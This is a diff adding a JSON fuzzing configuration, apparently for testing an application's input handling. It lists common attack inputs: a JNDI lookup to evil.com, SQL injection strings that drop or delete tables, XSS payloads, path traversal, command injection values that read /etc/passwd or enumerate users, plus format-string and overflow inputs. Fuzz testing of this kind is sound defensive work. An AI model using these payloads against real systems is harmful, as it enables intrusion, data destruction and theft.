@@ -1,0 +1,152 @@
+{
+  "custom_payloads": {
+    "fuzzstring": [
+      "{{",
+      "}}",
+      "${jndi:ldap://evil.com/a}",
+      "<script>alert('XSS')</script>",
+      "'; DROP TABLE artifacts; --",
+      "../../../etc/passwd",
+      "\\x00\\x01\\x02",
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "\u0000\u001f\u007f\uffff",
+      "1.#INF",
+      "1.#QNAN",
+      "NaN",
+      "Infinity",
+      "-Infinity",
+      "2147483647",
+      "-2147483648",
+      "9223372036854775807",
+      "-9223372036854775808",
+      "1e308",
+      "-1e308"
+    ],
+    "malformed_json": [
+      "{\"key\":}",
+      "{\"key\":\"value\",}",
+      "{key:\"value\"}",
+      "{'key':'value'}",
+      "{\"key\":\"val\\ue\"}",
+      "{\"key\":null}",
+      "{\"key\":undefined}",
+      "{\n\"key\":\n\"value\"\n}"
+    ],
+    "sql_injection": [
+      "' OR '1'='1",
+      "' UNION SELECT * FROM users --",
+      "'; DELETE FROM artifacts; --",
+      "1; DROP TABLE artifacts; --",
+      "admin'--",
+      "admin'/*",
+      "' OR 1=1#",
+      "' OR 'x'='x",
+      "1' OR '1'='1' --",
+      "x' OR name LIKE '%admin%' --"
+    ],
+    "xss_payloads": [
+      "<script>alert(1)</script>", 
+      "<img src=x onerror=alert(1)>",
+      "javascript:alert(1)",
+      "<svg/onload=alert(1)>",
+      "'\"><script>alert(1)</script>",
+      "<iframe src=javascript:alert(1)>",
+      "<body onload=alert(1)>",
+      "<input autofocus onfocus=alert(1)>",
+      "<select onfocus=alert(1) autofocus>",
+      "<textarea onfocus=alert(1) autofocus>"
+    ],
+    "path_traversal": [
+      "../",
+      "..\\",
+      "..%2f",
+      "..%5c", 
+      "....//",
+      "....\\\\",
+      "..%252f",
+      "..%255c",
+      "%2e%2e%2f",
+      "%2e%2e%5c",
+      "..%c0%af",
+      "..%ef%bc%8f"
+    ],
+    "command_injection": [
+      "; ls -la",
+      "| whoami",
+      "& dir",
+      "`id`",
+      "$(id)",
+      "; cat /etc/passwd",
+      "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "&& net user",
+      "; ps aux",
+      "| findstr password"
+    ],
+    "buffer_overflow": [
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "%n%n%n%n%n%n",
+      "%s%s%s%s%s%s",
+      "\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41",
+      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
+      "\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff"
+    ],
+    "unicode_attacks": [
+      "\\u0000",
+      "\\u001f", 
+      "\\u007f",
+      "\\u0080",
+      "\\u00ff",
+      "\\ufeff",
+      "\\uffff",
+      "\\U00010000",
+      "\\U0010ffff",
+      "\\u202e"
+    ],
+    "format_string": [
+      "%s%s%s%s%s%s%s%s%s%s",
+      "%p%p%p%p%p%p%p%p%p%p",
+      "%n%n%n%n%n%n%n%n%n%n", 
+      "%x%x%x%x%x%x%x%x%x%x",
+      "%d%d%d%d%d%d%d%d%d%d",
+      "AAAA%p%p%p%p",
+      "AAAA%x%x%x%x",
+      "AAAA%d%d%d%d",
+      "AAAA%s%s%s%s",
+      "AAAA%n%n%n%n"
+    ]
+  },
+  "mutation_strategies": {
+    "string_mutations": [
+      "append_random_chars",
+      "prepend_random_chars", 
+      "replace_random_chars",
+      "duplicate_string",
+      "reverse_string",
+      "case_mutations",
+      "encoding_mutations"
+    ],
+    "numeric_mutations": [
+      "boundary_values",
+      "negative_values",
+      "zero_values", 
+      "large_values",
+      "floating_point_edge_cases",
+      "integer_overflow"
+    ],
+    "array_mutations": [
+      "empty_arrays",
+      "single_element_arrays",
+      "large_arrays",
+      "nested_arrays",
+      "mixed_type_arrays"
+    ],
+    "object_mutations": [
+      "empty_objects",
+      "missing_required_fields",
+      "extra_fields", 
+      "nested_objects",
+      "circular_references"
+    ]
+  }
+}
